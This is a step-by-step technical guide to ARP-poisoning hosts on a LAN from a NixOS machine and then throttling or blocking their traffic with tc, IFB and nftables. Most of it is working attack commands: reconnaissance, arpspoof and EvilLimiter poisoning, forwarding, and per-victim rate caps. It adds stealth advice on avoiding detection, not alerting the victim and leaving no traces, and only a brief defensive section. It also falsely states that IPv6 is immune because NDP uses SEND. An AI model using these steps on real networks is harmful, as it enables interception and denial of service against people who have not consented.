# ARP Poisoning + QoS / Bandwidth Limiting on NixOS

### A Full Technical Reference for the `nftables`-First World

> **Scope:** Attacker machine runs NixOS Linux. Victim can be any OS on the same IPv4 LAN segment.
> **Purpose:** Educational / authorized network management. Only use on networks you own or have explicit written permission to test.

---

## 1. Conceptual Foundation

### 1.1 What We Are Actually Doing

The entire technique rests on three distinct layers working in concert:

**Layer 1 — Positioning (ARP Poisoning)**
We convince the victim that the attacker's MAC address is the gateway's MAC address, and simultaneously convince the gateway that the attacker's MAC address is the victim's MAC address. This puts all victim <-> internet traffic through the attacker's NIC.

**Layer 2 — Forwarding (Kernel IP Forwarding)**
Since intercepted packets are not destined for the attacker's IP, the Linux kernel must be instructed to forward them rather than drop them. Without this, the attack becomes a denial-of-service by accident.

**Layer 3 — Shaping (tc + HTB)**
Before forwarding, the kernel's traffic control subsystem (the `tc` tool, backed by Netfilter's mangle infrastructure) is used to throttle the flow rate of packets matching the victim's IP, effectively capping their bandwidth.

### 1.2 Why ARP Poisoning Works

ARP (Address Resolution Protocol) is stateless and trustless by design. RFC 826 (1982) defines the protocol with no authentication mechanism. Two critical weaknesses are:

- **Unsolicited replies are accepted.** A host will update its ARP cache upon receiving an ARP reply even if it never sent a request.
- **Gratuitous ARP is a feature.** Gratuitous ARP (a host announcing its own IP-to-MAC mapping) was designed for failover and IP conflict detection, but an attacker can craft these freely.

This means flooding a victim with `ARP reply: 192.168.1.1 is at [attacker MAC]` will reliably overwrite the gateway entry in the victim's ARP cache, redirecting all outbound traffic toward the attacker.

### 1.3 IPv4 Only — IPv6 is Immune

ARP exists only in IPv4. IPv6 uses NDP (Neighbor Discovery Protocol), which incorporates cryptographic authentication via SEND (Secure Neighbor Discovery). If the victim has a working IPv6 connection, that traffic bypasses this technique entirely. Plan accordingly — if you want full traffic capture/shaping, the victim must be IPv4-only or you must also handle the IPv6 path separately.

---

## 2. The Full Packet Journey

Understanding the exact kernel path a packet takes is critical to setting up tc shaping correctly.

```
[VICTIM] --(Ethernet)--> [ATTACKER NIC: ingress]
                                    |
                          Kernel netfilter PREROUTING
                                    |
                          Routing decision (forward)
                                    |
                          Kernel netfilter FORWARD
                          (nftables mangle: mark packet)
                                    |
                          tc egress qdisc on NIC
                          (HTB class applies rate limit)
                                    |
                         [GATEWAY] --> [INTERNET]

Return path (download traffic to victim):

[INTERNET] --> [GATEWAY] --(Ethernet)--> [ATTACKER NIC: ingress]
                                    |
                          ingress qdisc (no native shaping here!)
                          redirect via IFB trick --> ifb0 egress
                          (HTB class applies rate limit)
                                    |
                          forward to victim
```

The critical insight here is that **Linux tc can only natively shape *egress* (outgoing) traffic on an interface.** Ingress traffic (download from gateway to victim, passing through the attacker's NIC) requires the IFB (Intermediate Functional Block) virtual device trick to convert it into shapeable egress on a virtual interface.

---

## 3. ARP Poisoning Deep-Dive

### 3.1 Bidirectional Poisoning is Required

A one-sided ARP poison produces asymmetric routing that will quickly fail or create a half-duplex denial of service. You must poison both:

- **Victim -> attacker:** Tell the victim that the gateway's IP now lives at the attacker's MAC.
- **Gateway -> attacker:** Tell the gateway that the victim's IP now lives at the attacker's MAC.

If only the victim is poisoned, replies from the internet still route directly to the victim (the gateway still knows the real victim MAC), so the victim will receive RST packets, SYN-ACK mismatches, and TCP sessions will immediately break.

### 3.2 The ARP Packet Structure

An ARP reply (op=2) that poisons the victim looks like this:

| Field     | Spoofed Value                       | Purpose                                        |
|-----------|-------------------------------------|------------------------------------------------|
| `op`      | `2` (reply)                         | Unsolicited replies are cached by all OS types |
| `psrc`    | Gateway IP (`192.168.1.1`)          | We claim to *be* the gateway                   |
| `hwsrc`   | Attacker MAC (auto-filled by scapy) | Our MAC is now associated with gateway IP      |
| `pdst`    | Victim IP                           | Directing the reply to the victim              |
| `hwdst`   | Victim MAC (resolved first)         | Layer-2 delivery to the correct host           |

And for poisoning the gateway:

| Field     | Spoofed Value     |
|-----------|-------------------|
| `psrc`    | Victim IP         |
| `hwsrc`   | Attacker MAC      |
| `pdst`    | Gateway IP        |
| `hwdst`   | Gateway MAC       |

### 3.3 MAC Resolution Before Poisoning

Before sending any spoofed packets, you must know the real MAC addresses of both the victim and the gateway. This is done via a proper ARP request using `scapy.srp()` on layer 2 (`Ether/ARP`), not the high-level `scapy.sr()`. The distinction matters on NixOS because raw socket access requires the process to have `CAP_NET_RAW` capability.

### 3.4 Poison Refresh Rate

ARP cache entries have TTLs. On Linux, the default is around 60 seconds; on Windows, it can be as low as 30 seconds. The poison loop must re-send ARP replies continuously — typically every 1-2 seconds — to keep the cache entries overwritten before they expire or are legitimately refreshed.

A frequency of 2 seconds is the sweet spot used by EvilLimiter and similar tools: aggressive enough to maintain the MITM position, passive enough to avoid generating obvious ARP flood noise on the network.

### 3.5 Scapy on NixOS — Raw Sockets and Capabilities

On NixOS, running scapy's `srp()` and `send()` functions requires either:

- Running as root (`sudo`)
- Granting `CAP_NET_RAW` + `CAP_NET_ADMIN` capabilities to the Python interpreter

Since NixOS doesn't use a mutable `/etc/sudoers` in the traditional sense, the idiomatic approach is to add the tool to the system or user environment via `configuration.nix` and grant it elevated permissions through a wrapper or a systemd service with `AmbientCapabilities`. For ad-hoc use, `sudo` with the full nix store path to python is the simplest option.

---

## 4. Traffic Shaping Internals — tc, HTB, and IFB

### 4.1 The tc Tool and Netfilter's tc Subsystem

`tc` (traffic control) is the userspace front-end to the Linux kernel's traffic control framework, part of `iproute2`. It manipulates qdiscs (queuing disciplines), classes, and filters attached to network interfaces.

The tc subsystem and nftables/netfilter are separate kernel subsystems, but they communicate through **packet marks** (`fwmark`). Nftables marks a packet with a numeric label; tc filters match that label and route the packet into a specific HTB class with a defined rate limit.

### 4.2 HTB (Hierarchical Token Bucket)

HTB is the most widely-used classful qdisc for traffic shaping. Key properties:

- **Guaranteed rate:** Each class has a `rate` — the minimum bandwidth that class is guaranteed.
- **Ceiling rate:** Each class has a `ceil` — the maximum bandwidth it can ever use, even if unused bandwidth is available.
- **Borrowing:** Classes can borrow unused bandwidth from their parent, up to `ceil`.

For bandwidth limiting, you typically set `rate` and `ceil` to the same value to create a hard cap with no burst borrowing.

**HTB class hierarchy for a single victim:**

```
Root qdisc (1:)
    +-- HTB class (1:1) -- total interface bandwidth
            +-- HTB class (1:10) -- victim's upload cap (e.g., 512kbit)
            +-- HTB class (1:20) -- default class (everything else, unlimited)
```

### 4.3 SFQ as a Leaf Qdisc

Attaching SFQ (Stochastic Fairness Queuing) as a leaf qdisc beneath each HTB class ensures that within a rate-limited class, individual TCP flows still get fair treatment. Without a leaf qdisc, HTB uses FIFO, which allows a single connection to starve all others. For realistic traffic shaping, adding `sfq perturb 10` under each leaf class is good practice.

### 4.4 IFB (Intermediate Functional Block) — The Ingress Trick

The Linux kernel cannot apply shaping qdiscs directly to ingress (incoming) traffic on an interface. The workaround:

1. Create a virtual `ifb0` interface (`modprobe ifb`)
2. Attach an `ingress` qdisc to the physical NIC (`tc qdisc add dev eth0 handle ffff: ingress`)
3. Install a u32 filter on that ingress qdisc that **redirects all incoming packets** to `ifb0` as if they were *outgoing* from `ifb0` (using `action mirred egress redirect dev ifb0`)
4. Attach a full HTB shaping hierarchy to `ifb0 root` — now you can shape the redirected incoming traffic

This is identical to what EvilLimiter does internally, and is the canonical Linux approach.

### 4.5 The nftables -> tc Packet Mark Bridge

Since we're on NixOS with nftables (not iptables), packet marking uses the nftables `meta mark set` statement in a mangle-equivalent context. The mark is a 32-bit integer that tc filters read via the `fw` (firewall mark) classifier.

The key nftables hook for FORWARD traffic is:

```nft
table ip mangle {
    chain FORWARD {
        type filter hook forward priority mangle;
        # mark forwarded packets from victim IP
        ip saddr 192.168.1.50 meta mark set 0x1
        ip daddr 192.168.1.50 meta mark set 0x2
    }
}
```

tc then matches `handle 0x1` (upload) and `handle 0x2` (download) and routes into the appropriate HTB classes.

---

## 5. NixOS-Specific Architecture

### 5.1 nftables, Not iptables

NixOS since ~21.11 has formally migrated its firewall module to nftables. The `networking.firewall` module now generates nftables rules internally. There is **no iptables** on a clean NixOS installation unless explicitly added.

This is critical because nearly all existing MITM bandwidth-limiting documentation (including the original EvilLimiter, Arch Wiki guides, OpenWrt examples) uses `iptables -t mangle` for packet marking. On NixOS, the equivalent is nftables with a `mangle`-priority chain.

**Key difference:** In iptables, `MARK` is a target in the `mangle` table. In nftables, there is no `mangle` table by default — you create a table with any name and set the chain priority to `mangle` (numeric value `-150`). The statement is `meta mark set <value>` instead of `-j MARK --set-mark <value>`.

### 5.2 The NixOS Firewall Module Conflict

When `networking.firewall.enable = true` (the default), NixOS generates a comprehensive nftables ruleset that includes a `FORWARD` chain with a `drop` policy. This will silently drop all forwarded packets — including the ARP-poisoned victim traffic you are trying to route.

You have two clean options:

**Option A — Disable the NixOS firewall and write your own ruleset:**

```nix
networking.firewall.enable = false;
networking.nftables.enable = true;
networking.nftables.ruleset = ''
  # your custom ruleset here
'';
```

**Option B — Keep the firewall but allow forwarding for your interface:**

```nix
networking.firewall.enable = true;
networking.firewall.extraForwardRules = ''
  iifname "eth0" oifname "eth0" accept
'';
```

Option A is cleaner for a dedicated testing machine. Option B is safer for a daily-driver machine where you still want the firewall active.

### 5.3 IP Forwarding — The NixOS Way

On a standard Linux distro you'd write `echo 1 > /proc/sys/net/ipv4/ip_forward`. On NixOS, the declarative approach is:

```nix
boot.kernel.sysctl = {
  "net.ipv4.ip_forward" = 1;
  # Disable rp_filter to avoid dropping ARP-spoofed forwarded packets
  "net.ipv4.conf.all.rp_filter" = 0;
  "net.ipv4.conf.default.rp_filter" = 0;
};
```

For a live session without rebuilding, you can use:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo sysctl -w net.ipv4.conf.all.rp_filter=0
```

**The `rp_filter` warning:** Reverse path filtering (`rp_filter`) can drop forwarded packets that appear to violate routing symmetry — which is exactly what happens during ARP poisoning because the packets arrive on the same interface they'd normally leave on. Setting `rp_filter=0` disables this check for forwarded traffic.

### 5.4 NixOS Kernel Modules

The IFB trick requires the `ifb` kernel module. On NixOS:

```nix
boot.kernelModules = [ "ifb" "act_mirred" "sch_htb" "sch_sfq" "cls_fw" ];
```

Or loaded at runtime:

```bash
sudo modprobe ifb numifbs=1
sudo modprobe act_mirred
sudo modprobe sch_htb
```

### 5.5 Required Packages in `environment.systemPackages`

```nix
environment.systemPackages = with pkgs; [
  iproute2      # provides tc and ip
  nftables      # provides nft
  python3       # for scapy-based ARP spoofing
  python3Packages.scapy
  python3Packages.netifaces
  tcpdump       # optional: traffic verification
  nmap          # optional: host discovery
];
```

### 5.6 EvilLimiter's Nix Package (from Masrkai's fork)

The Masrkai fork of EvilLimiter includes a `shell.nix` and a standalone `evillimiter.nix` derivation. It explicitly wraps the binary with `iproute2` and `nftables` in PATH via `makeWrapper`, because EvilLimiter calls `nft` and `tc` as shell subprocesses. This is important because in NixOS, tools in the nix store do not live at `/usr/sbin/tc` or `/sbin/nft` — they live at paths like `/nix/store/<hash>-iproute2-<ver>/bin/tc`. Without the `makeWrapper` PATH injection, EvilLimiter will fail silently when it tries to execute these commands.

If building the tool manually (not using the `.nix` derivation), you must ensure `tc` and `nft` are resolvable in `$PATH` when running with `sudo`, which on NixOS means using `sudo env PATH=$PATH evillimiter` or configuring `secure_path` appropriately.

### 5.7 Immutable Filesystem Consideration

NixOS's `/etc` is partially managed by the activation system. Running `nft` commands at runtime works fine and takes immediate effect, but they are **not persistent across reboots** unless declared in `configuration.nix`. For a field-use session this is actually desirable — all tc and nftables rules evaporate on reboot, leaving no traces in the system configuration.

---

## 6. Implementation Pipeline (Step-by-Step)

### Phase 0 — Reconnaissance

Before anything else, map the network:

1. Identify your attacker's interface name (`ip link show`). On NixOS this is often a predictable name like `eth0`, `enp3s0`, `wlan0`, or `wlp2s0`. Note it exactly.
2. Identify your gateway IP and MAC. The gateway is typically the default route: `ip route show default`.
3. Resolve the gateway MAC: `arping -c 1 -I <iface> <gateway_ip>` or `arp -n`.
4. Discover victim IPs: use `nmap -sn <subnet>/24` for a ping sweep.
5. Resolve victim MACs: `arping -c 1 -I <iface> <victim_ip>`.

Record: attacker interface, attacker IP, attacker MAC, gateway IP, gateway MAC, victim IP, victim MAC.

### Phase 1 — Enable IP Forwarding

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo sysctl -w net.ipv4.conf.all.rp_filter=0
```

Verify: `cat /proc/sys/net/ipv4/ip_forward` should return `1`.

If the NixOS firewall is active and has a FORWARD drop policy, you must add a forward accept rule before poisoning begins, otherwise every forwarded packet will be silently dropped.

### Phase 2 — Prepare nftables for Forwarding

If using the default NixOS firewall, add this at runtime:

```bash
# Allow forwarding between same interface (loopback MITM)
sudo nft add rule inet nixos-fw FORWARD iifname "eth0" oifname "eth0" accept
```

Or if you've disabled the NixOS firewall and are writing your own ruleset:

```bash
sudo nft flush ruleset
sudo nft add table inet filter
sudo nft add chain inet filter forward { type filter hook forward priority 0 \; policy accept \; }
```

### Phase 3 — Load Kernel Modules for Traffic Shaping

```bash
sudo modprobe ifb numifbs=1
sudo modprobe act_mirred
sudo modprobe sch_htb
sudo modprobe sch_sfq
sudo modprobe cls_fw
```

Verify IFB is available: `ip link show ifb0` should show the interface (likely in DOWN state initially).

### Phase 4 — Start ARP Poisoning (Bidirectional)

This is done via a continuous loop sending crafted ARP replies. The tooling options on NixOS:

**Option A — EvilLimiter (Masrkai fork, recommended):**

```bash
sudo evillimiter -i eth0 -g <gateway_ip>
```

Then inside the interactive console:

```
scan
hosts
limit <target_id> 512kbit
```

**Option B — `arpspoof` from dsniff (two terminals):**

```bash
sudo arpspoof -i eth0 -t <victim_ip> <gateway_ip>
sudo arpspoof -i eth0 -t <gateway_ip> <victim_ip>
```

Note: `dsniff` may not be in nixpkgs; use EvilLimiter as the primary option on NixOS.

### Phase 5 — Set Up tc Traffic Shaping (Upload / Egress)

Upload shaping (victim -> internet) is applied to the egress of your physical interface. Packets flowing from the ARP-poisoned victim arrive at your NIC, get forwarded through the kernel, and exit via the same NIC back toward the gateway. tc's egress qdisc catches them on the way out.

```bash
IFACE="eth0"
VICTIM_IP="192.168.1.50"
MARK_UP=1
RATE_UP="512kbit"

# 1. Add HTB root qdisc
sudo tc qdisc add dev $IFACE root handle 1: htb default 99

# 2. Root class (must be >= sum of all children ceiling)
sudo tc class add dev $IFACE parent 1: classid 1:1 htb rate 1000mbit ceil 1000mbit

# 3. Limited class for victim upload
sudo tc class add dev $IFACE parent 1:1 classid 1:10 htb rate $RATE_UP ceil $RATE_UP

# 4. Default unlimited class (everything else)
sudo tc class add dev $IFACE parent 1:1 classid 1:99 htb rate 1000mbit ceil 1000mbit

# 5. Leaf SFQ for fairness within the limited class
sudo tc qdisc add dev $IFACE parent 1:10 handle 10: sfq perturb 10

# 6. tc filter: match mark MARK_UP, route to victim upload class
sudo tc filter add dev $IFACE parent 1:0 protocol ip handle $MARK_UP fw flowid 1:10
```

### Phase 6 — Set Up tc Traffic Shaping (Download / Ingress via IFB)

Download shaping (internet -> victim) requires the IFB trick:

```bash
IFACE="eth0"
VICTIM_IP="192.168.1.50"
MARK_DOWN=2
RATE_DOWN="512kbit"

# 1. Bring up IFB interface
sudo ip link set dev ifb0 up

# 2. Add ingress qdisc to physical interface
sudo tc qdisc add dev $IFACE handle ffff: ingress

# 3. Redirect ALL ingress traffic on eth0 to ifb0 egress
#    "protocol all" is critical — do not use "protocol ip" here
sudo tc filter add dev $IFACE parent ffff: protocol all u32 match u32 0 0 \
    action connmark \
    action mirred egress redirect dev ifb0

# 4. Add HTB root qdisc on IFB
sudo tc qdisc add dev ifb0 root handle 2: htb default 99

# 5. Root class on IFB
sudo tc class add dev ifb0 parent 2: classid 2:1 htb rate 1000mbit ceil 1000mbit

# 6. Limited class for victim download
sudo tc class add dev ifb0 parent 2:1 classid 2:10 htb rate $RATE_DOWN ceil $RATE_DOWN

# 7. Default unlimited class
sudo tc class add dev ifb0 parent 2:1 classid 2:99 htb rate 1000mbit ceil 1000mbit

# 8. Leaf SFQ on limited class
sudo tc qdisc add dev ifb0 parent 2:10 handle 20: sfq perturb 10

# 9. tc filter on IFB: match mark MARK_DOWN, route to victim download class
sudo tc filter add dev ifb0 parent 2:0 protocol ip handle $MARK_DOWN fw flowid 2:10
```

### Phase 7 — Apply nftables Packet Marks

See Section 7 for the full nftables marking ruleset that connects these tc classes to actual victim traffic.

---

## 7. nftables Packet Marking for tc Integration

This replaces the classic `iptables -t mangle -A FORWARD -s <victim> -j MARK --set-mark 1` approach.

```nft
table ip mangle {
    chain FORWARD {
        type filter hook forward priority mangle;
        policy accept;

        # Mark victim's upload (victim is source, going to internet)
        ip saddr 192.168.1.50 meta mark set 0x00000001

        # Mark victim's download (victim is destination)
        ip daddr 192.168.1.50 meta mark set 0x00000002
    }
}
```

Apply at runtime:

```bash
sudo nft -f /path/to/mangle.nft
```

Verify the ruleset is loaded:

```bash
sudo nft list ruleset
```

### 7.1 The CONNMARK Challenge for Ingress

There is a subtle complication. When download traffic (internet -> victim) enters the attacker's NIC ingress, it has a destination of the victim's IP. However, the ingress qdisc on the physical NIC runs **before** the full Netfilter PREROUTING hook processes the packet. This means the `meta mark` set by nftables in the FORWARD chain isn't visible to the raw ingress tc filter at `ffff:`.

The clean solution used by EvilLimiter and documented in the Arch Linux Advanced Traffic Control wiki is the **CONNMARK technique:**

1. In nftables FORWARD, mark the connection using `ct mark set meta mark` when the packet is outbound (upload direction). This saves the mark into the conntrack entry.
2. On ingress (the IFB redirect filter), use `action connmark` to restore the connection mark onto the incoming packet before it reaches the IFB shaping qdisc.

This way, download packets inherit the mark from their associated upload connection, and tc can classify them into the correct rate-limited HTB class.

The nftables implementation for saving and restoring the connmark:

```nft
table ip mangle {
    chain FORWARD {
        type filter hook forward priority mangle;
        policy accept;

        # Upload: mark packet and save to connection tracking entry
        ip saddr 192.168.1.50 meta mark set 0x1 ct mark set meta mark

        # Download: restore from connection mark, then apply download mark
        ip daddr 192.168.1.50 ct mark != 0 meta mark set ct mark
        ip daddr 192.168.1.50 meta mark set 0x2
    }
}
```

---

## 8. Ingress Shaping via IFB

### 8.1 The act_mirred Module

The ingress redirect relies on `act_mirred`, a tc action module that mirrors or redirects packets to another interface. On NixOS, this module must be loaded:

```bash
sudo modprobe act_mirred
```

Without it, the `action mirred` directive in the tc filter will silently fail.

### 8.2 Protocol `all` vs `ip` in the Ingress Redirect

A common mistake (noted in the Gentoo Traffic Shaping wiki) is using `protocol ip` in the ingress filter that redirects to IFB. This causes ARP traffic and IPv6 to bypass the IFB, which can cause connectivity issues and ARP table self-healing. Use `protocol all` for the redirect filter so that all layer-2 traffic is correctly forwarded.

### 8.3 GRO/TSO/GSO Offloading

Hardware offloading features (Generic Receive Offload, TCP Segmentation Offload, Generic Segmentation Offload) can interfere with tc shaping by delivering super-sized packets (up to 64KB) to the kernel, making rate limiting inaccurate. On a dedicated testing machine, disable them:

```bash
sudo ethtool -K eth0 tso off gso off gro off
```

---

## 9. Multi-Target Management

### 9.1 Per-Victim HTB Classes

The architecture scales to multiple victims by assigning each a unique mark value and a unique HTB class:

| Victim IP     | Upload Mark | Download Mark | Upload Class  | Download Class |
|---------------|-------------|---------------|---------------|----------------|
| 192.168.1.50  | 0x01        | 0x02          | 1:10 / 2:10   | 2:10           |
| 192.168.1.51  | 0x03        | 0x04          | 1:20 / 2:20   | 2:20           |
| 192.168.1.52  | 0x05        | 0x06          | 1:30 / 2:30   | 2:30           |

Each victim gets two marks (upload and download) and two HTB leaf classes (one on the physical NIC tree, one on the IFB tree).

### 9.2 Dynamic Class Addition

HTB supports adding classes at runtime without tearing down the entire qdisc:

```bash
# Add a new victim class without resetting existing ones
sudo tc class add dev eth0 parent 1:1 classid 1:20 htb rate 256kbit ceil 256kbit
sudo tc filter add dev eth0 parent 1:0 protocol ip handle 3 fw flowid 1:20
```

### 9.3 The "Block" Case

EvilLimiter's `block` command is implemented by setting the rate and ceil to an extremely low value (effectively 0, or 1bit in practice) rather than attempting to drop all packets. This is because dropping at tc level creates aggressive TCP retransmission storms, which is noisy on the network. Setting an extremely low rate allows the TCP stack to throttle gracefully without generating error signals that might alert the victim's system.

For a complete block: `rate 1bit ceil 1bit` effectively prevents any useful traffic.

### 9.4 EvilLimiter's Watch Feature

The Masrkai fork includes a `watch` subsystem that monitors for reconnecting hosts — if a victim reconnects with a different IP (e.g., after a DHCP lease renewal or manual reconnect), the tool automatically re-applies the limit. This is implemented as a periodic network scan combined with MAC-address tracking. The lesson: **limit by MAC address at the ARP/tc level, not just by IP**, so reconnects don't automatically escape the rate limit.

In tc terms, you can filter by MAC at the source with `u32` filters rather than `fw` (fwmark) filters, which bypasses the nftables marking layer entirely but is less flexible:

```bash
# u32 filter matching a specific destination MAC (for download direction)
sudo tc filter add dev ifb0 parent 2:0 protocol ip prio 1 u32 \
    match ether dst aa:bb:cc:dd:ee:ff at -14 flowid 2:10
```

---

## 10. Lessons from EvilLimiter (Masrkai's Fork)

EvilLimiter is the most complete open-source reference implementation of this technique. Key architectural decisions and lessons:

### 10.1 Transition from iptables to nftables

The original `bitbrute/evillimiter` used `iptables -t mangle` for packet marking. The Masrkai fork migrated to nftables, making it functional on modern NixOS without installing iptables compatibility shims. The Nix derivation (`evillimiter.nix`) explicitly includes `nftables` in `propagatedBuildInputs` and injects it into PATH via `makeWrapper`, which is the correct pattern for NixOS.

### 10.2 The `-f` Flag — Always Flush First

EvilLimiter's `-f` flag flushes both the nftables ruleset and all tc qdiscs before starting. This is essential because stale tc qdiscs will cause `tc qdisc add` to fail with "File exists" errors. Similarly, stale nftables mangle rules can cause double-marking or rule conflicts.

Always run a cleanup before your setup:

```bash
# Clear tc on physical interface
sudo tc qdisc del dev eth0 root 2>/dev/null || true
sudo tc qdisc del dev eth0 ingress 2>/dev/null || true

# Clear tc on IFB
sudo tc qdisc del dev ifb0 root 2>/dev/null || true

# Clear your mangle table
sudo nft delete table ip mangle 2>/dev/null || true
```

### 10.3 Rate Unit Precision

EvilLimiter supports `bit`, `kbit`, `mbit`, `gbit` as rate units, which map directly to tc's rate units. Important: `tc` uses **bits**, not bytes. So `512kbit` = 64 KB/s, not 512 KB/s. A common mistake is confusing kbit/s and KB/s when setting limits. When translating from KB/s values (e.g., "limit to 100 KB/s"), multiply by 8 to get the kbit value for tc (`100 KB/s = 800kbit`).

### 10.4 The `analyze` Command

EvilLimiter's `analyze` command runs a passive traffic monitor against a target before applying limits — useful to understand what the baseline traffic looks like and to pick an appropriate limit. Under the hood this is a combination of packet capture (scapy sniffing) and rate calculation over a time window. The lesson: measure first, limit second. Setting too aggressive a limit can break applications in ways that look like connectivity issues rather than throttling.

### 10.5 Python Dependency Stack on NixOS

EvilLimiter requires: `scapy`, `netifaces`, `netaddr`, `colorama`, `tqdm`, `terminaltables`, `setuptools`. On NixOS, all of these are available in `python3Packages`. The `shell.nix` in the EvilLimiter repo provides a quick development environment. For system-wide installation, the `evillimiter.nix` derivation handles everything correctly including the PATH injection for tc/nft.

### 10.6 IPv4-Only Scope

EvilLimiter explicitly documents that it only limits IPv4 connections because ARP is an IPv4-only protocol. For the MITM position to be effective for all traffic, the victim must be IPv4-only, or you must separately handle IPv6 (via NDP spoofing, which requires different tooling). The tool does not attempt to handle IPv6.

### 10.7 NixOS PATH Problem — The Core Pitfall

When running EvilLimiter (or any tool that shells out to `tc` and `nft`) with `sudo` on NixOS, the `sudo` environment uses a restricted `secure_path` that does not include the nix store. The binaries at `/run/current-system/sw/bin/` may or may not be in that path. The `makeWrapper` approach in the `.nix` derivation hardcodes the full store paths into the wrapper script, which is why building from the derivation is strongly preferred over `pip install` or manual setup on NixOS.

---

## 11. Teardown and ARP Restoration

**This is the most critical cleanup phase.** Leaving the ARP cache in a poisoned state after stopping the forwarding infrastructure creates a denial-of-service condition for the victim — their traffic flows to the attacker who is no longer forwarding it.

### 11.1 ARP Restoration

Send several (5-7) legitimate ARP replies to both victim and gateway to restore their caches. The restoration packets use the *real* MAC addresses of each party:

- To victim: `ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)`
- To gateway: `ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac)`

Sending multiple copies at once reduces the risk of a packet drop leaving the cache corrupted. EvilLimiter does this automatically on `quit` or `free <id>`.

### 11.2 tc Cleanup Commands

```bash
sudo tc qdisc del dev eth0 root 2>/dev/null || true
sudo tc qdisc del dev eth0 ingress 2>/dev/null || true
sudo tc qdisc del dev ifb0 root 2>/dev/null || true
sudo ip link set dev ifb0 down
```

### 11.3 nftables Cleanup

```bash
sudo nft delete table ip mangle
```

If you disabled the NixOS firewall and wrote a custom ruleset, either flush and re-apply the original ruleset or reboot — NixOS's activation script will restore the declared state on the next `nixos-rebuild switch` or reboot.

---

## 12. Pitfalls and Edge Cases

### 12.1 Same-Interface Forwarding

Since the attacker is on the same LAN segment as both the victim and the gateway, all traffic arrives and leaves on the *same* physical interface (`eth0` in, `eth0` out). This is different from a traditional router scenario where input and output interfaces differ. Some tc filter setups assume different interfaces and may not work correctly. The IFB approach handles this correctly because it creates the ingress-to-IFB redirect on the physical NIC regardless of what interface the packet will eventually egress on.

### 12.2 The rp_filter Problem

Reverse path filtering will drop forwarded packets when the expected route for the source IP exits on a different interface than the one the packet arrived on. This is exactly what happens with same-interface MITM forwarding. **You must disable rp_filter** (`net.ipv4.conf.all.rp_filter=0`) for the technique to work.

### 12.3 NixOS Firewall FORWARD Drop

The NixOS `networking.firewall` module's `nixos-fw` nftables chain has a FORWARD hook that drops packets unless explicitly permitted. This is the most common cause of "ARP poisoning works but no traffic flows" failures on NixOS. Always verify forwarding is actually working by checking packet counters:

```bash
sudo tc -s qdisc show dev eth0
sudo nft list ruleset | grep counter
```

If the tc qdisc shows no bytes processed, the packets are being dropped before they reach tc.

### 12.4 Switch-Level Protections

Managed switches often have ARP inspection features (Dynamic ARP Inspection on Cisco/Aruba) that validate ARP packets against a DHCP snooping binding table. On such networks, forged ARP replies will be silently dropped at the switch level and the technique will fail entirely. This is common in enterprise environments and rare in home/SOHO networks.

### 12.5 Static ARP Entries on Victim

If the victim (or gateway) has a static ARP entry for the other party, the cache won't be updated by forged replies. Static ARP entries are uncommon in general but can be set by security-conscious administrators on critical infrastructure.

### 12.6 Victim Has Multiple Gateways or Uses IPv6

If the victim's traffic routes through a different gateway for some destinations (policy routing, VPN, etc.) or uses IPv6 for internet-bound traffic, the MITM position only covers IPv4 traffic through the poisoned gateway. Remaining traffic bypasses you entirely and won't be subject to your rate limits.

### 12.7 tc Filter Handle Collisions

When adding multiple victims, each must have a unique mark value. If you accidentally reuse a mark value, two victims will share the same HTB class and rate, and the second victim's dedicated class will never receive traffic. Always maintain a mapping of victim to mark value.

### 12.8 EvilLimiter's `limit all` Caveat

EvilLimiter supports `limit all` which applies limits to all scanned hosts simultaneously. However, this also limits the gateway itself if it appears in the scan results. Always review the host list and exclude the gateway IP to avoid cutting off your own forwarding path.

### 12.9 `numifbs` Parameter for Multiple IFB Devices

If you need to shape traffic for multiple attacker machines simultaneously (or run multiple independent sessions), you can load multiple IFB devices:

```bash
sudo modprobe ifb numifbs=4  # creates ifb0, ifb1, ifb2, ifb3
```

Each attacker session gets its own IFB device and its own ingress redirect. The default `modprobe ifb` only creates one (`ifb0`).

---

## 13. Detection and Hardening Awareness

Understanding how this technique is detected helps build more realistic test scenarios and understand defensive posture.

### 13.1 ARP Anomaly Detection

Tools like `arpwatch`, `XArp`, and various SIEM solutions monitor for:

- Duplicate IP-to-MAC associations (two IPs sharing one MAC, or one IP associated with multiple MACs over time)
- Unsolicited ARP replies (gratuitous ARP storms)
- MAC address changes for known hosts

On the attacker side, sending ARP replies at 1-2 second intervals is a detectable ARP storm pattern. Slower intervals (10-30 seconds) are harder to detect but less reliable at maintaining the MITM position.

### 13.2 Bandwidth Limiting as an Observable Signal

From the victim's perspective, a sudden unexplained bandwidth reduction to a consistent ceiling value is suspicious — especially if it affects only internet-bound traffic while local LAN communication remains fast. This is a common first signal that something is wrong on the network.

### 13.3 Victim-Side Mitigation Techniques

- **HTTPS/TLS:** Traffic volume is visible but content is not. Rate limiting still works regardless of encryption.
- **VPN (IPsec, WireGuard, OpenVPN):** Traffic is encrypted and the VPN server is the true destination. Rate limiting the VPN tunnel works, but individual application traffic is obscured.
- **Static ARP entries:** Completely defeats ARP poisoning for hosts that have them configured. The simplest and most effective defense.
- **802.1X / Dynamic ARP Inspection:** Switch-level protection that validates ARP at the port level.

---

## Summary Architecture Diagram

```
NixOS Attacker Machine (eth0: 192.168.1.100)
==============================================================================

Kernel Space:
+--------------------------------------------------------------------------+
|  net.ipv4.ip_forward = 1                                                 |
|  net.ipv4.conf.all.rp_filter = 0                                         |
|                                                                           |
|  nftables: table ip mangle                                               |
|    chain FORWARD (hook forward, priority mangle)                         |
|      ip saddr <victim>  -->  meta mark set 0x1  +  ct mark set meta mark |
|      ip daddr <victim>  -->  ct restore mark  +  meta mark set 0x2       |
|                                                                           |
|  tc on eth0 (egress / upload shaping):                                   |
|    root: htb 1:                                                           |
|      class 1:1  (root, 1000mbit)                                         |
|        class 1:10  (victim upload, 512kbit)  <-- fw handle 0x1           |
|          sfq perturb 10                                                   |
|        class 1:99  (default, unlimited)                                  |
|                                                                           |
|  eth0 ingress --> act_connmark + act_mirred redirect --> ifb0            |
|                                                                           |
|  tc on ifb0 (virtual, for ingress / download shaping):                   |
|    root: htb 2:                                                           |
|      class 2:1  (root, 1000mbit)                                         |
|        class 2:10  (victim download, 512kbit)  <-- fw handle 0x2         |
|          sfq perturb 10                                                   |
|        class 2:99  (default, unlimited)                                  |
+--------------------------------------------------------------------------+

